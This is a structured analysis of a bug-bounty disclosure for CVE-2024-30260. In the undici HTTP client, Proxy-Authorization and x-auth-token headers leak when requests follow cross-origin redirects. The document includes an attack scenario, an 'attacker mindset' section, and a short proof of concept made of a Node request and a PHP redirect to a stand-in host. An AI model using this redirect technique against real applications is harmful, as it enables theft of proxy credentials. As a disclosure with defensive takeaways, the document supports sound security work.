# Proxy-Authorization header not cleared on cross-origin redirect in undici.request

## Metadata
- **Source:** HackerOne
- **Report:** 2451113 | https://hackerone.com/reports/2451113
- **Submitted:** 2024-04-07
- **Reporter:** iylz
- **Program:** undici (Node.js HTTP client)
- **Bounty:** Not specified
- **Severity:** high
- **Vuln:** Information Disclosure, Credential Leakage, Improper Input Validation
- **CVEs:** CVE-2024-30260
- **Category:** web-api

## Summary
Undici failed to clear sensitive authentication headers (Proxy-Authorization and x-auth-token) when following cross-origin HTTP redirects, despite properly clearing Authorization and Cookie headers. This allows attacker-controlled redirect destinations to receive sensitive proxy credentials intended for the original request.

## Attack scenario
1. Attacker registers or controls domain a.com and sets up HTTP server listening on port 2333
2. Victim application uses undici.request() with legitimate credentials including Proxy-Authorization header to access http://127.0.0.1/
3. Attacker's malicious server at 127.0.0.1 responds with HTTP redirect (Location: http://a.com:2333)
4. Undici follows the redirect to a.com:2333, clearing Authorization/Cookie headers but failing to clear Proxy-Authorization
5. Attacker's server at a.com:2333 receives the sensitive Proxy-Authorization header in the follow-up request
6. Attacker extracts and reuses the proxy credentials to bypass authentication or access protected resources

## Root cause
The redirect handling logic in undici selectively clears specific sensitive headers (Authorization, Cookie) on cross-origin redirects but omits Proxy-Authorization and x-auth-token headers from the clearance list. The security check is incomplete and inconsistent.

## Attacker mindset
An attacker would leverage this vulnerability to harvest proxy credentials from applications that redirect through attacker-controlled domains. By registering domains or compromising intermediate servers, they can intercept sensitive proxy authentication headers that should have been stripped, then reuse these credentials for unauthorized proxy access.

## Defensive takeaways
- Maintain comprehensive allowlist of all sensitive headers that must be cleared on cross-origin redirects (Authorization, Cookie, Proxy-Authorization, x-auth-token, and similar auth headers)
- Implement centralized header sanitization function for redirect scenarios to ensure consistent behavior
- Test redirect handling explicitly with all credential types (Bearer tokens, Basic auth, Proxy-Authorization, custom auth tokens)
- Consider disallowing cross-origin redirects by default and requiring explicit configuration rather than permissive-by-default approach
- Regularly audit HTTP client libraries for incomplete security controls when updating versions

## Variant hunting
Check if other HTTP client libraries (axios, node-fetch, got, request) properly handle all auth header variants on redirects
Search for similar incomplete header clearance in redirect logic - other headers like Proxy-Authenticate, WWW-Authenticate, Authorization-* variants
Test custom x-* header variants that may indicate authentication (x-api-key, x-token, x-access-token)
Verify behavior with multiple consecutive redirects across different origin combinations
Check if 3xx redirect status codes are uniformly handled (301, 302, 303, 307, 308 may have different semantics)

## MITRE ATT&CK
- T1190
- T1598
- T1111
- T1040

## Notes
This is a regression or incomplete fix - undici v5.28.3 and v6.6.1 supposedly fixed similar issues with Authorization/Cookie headers, but the fix was incomplete, missing Proxy-Authorization and x-auth-token. The vulnerability affects real-world scenarios where applications use proxy configurations with authentication. The MDN reference confirms Proxy-Authorization is a sensitive header requiring protection.

## Full report
<details><summary>Expand</summary>

Summary:: Undici already cleared Authorization and Cookie headers on cross-origin redirects, but did not clear Proxy-Authorization and x-auth-token headers.

Description:
Like https://github.com/nodejs/undici/security/advisories/GHSA-3787-6prv-h9w3, this is a fixed security issue in v5.28.3, v6.6.1, but I have tested the new version(v6.7.0) and it has not been fixed yet.

Steps To Reproduce:
POC:
```
var undici = require('undici');

const {
    statusCode,
    headers,
    trailers,
    body
} = undici.request({
    method: 'GET',
    maxRedirections: 1,
    origin: "http://127.0.0.1/", 
    pathname: "",
    headers: {
        'content-type': 'application/json',
        'Cookie': 'secret Cookie',
        'Authorization': 'secret Authorization',
        'Proxy-Authorization': 'secret Proxy-Authorization',
        'x-auth-token': 'secret x-auth-token',
        'Host': 'test.cn'
    }
})
```

The http://127.0.0.1/ is a redirect server. Sourcecode:
```
<?php
header("Location: http://a.com:2333");
?>
```
Add the 1 record in the /etc/hosts file:
```
127.0.0.1   a.com
```
Listening on port 2333 and discovering that Proxy-Authorization headers has been passed.


Impact:
```<=undici@6.7.0```
Supporting Material/References:
https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Proxy-Authorization

## Impact

Undici already cleared Authorization and Cookie headers on cross-origin redirects, but did not clear Proxy-Authorization headers.

</details>

---
*Analysed by Claude on 2026-05-24*
